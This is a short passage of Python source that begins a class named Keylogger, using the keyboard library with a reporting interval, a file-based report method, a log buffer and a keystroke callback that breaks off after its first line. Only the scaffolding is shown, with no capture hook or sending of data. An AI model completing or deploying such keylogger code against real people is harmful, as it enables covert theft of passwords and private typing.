import keyboard
from threading import Timer
from datetime import datetime

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.reportt_method = 'file'
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        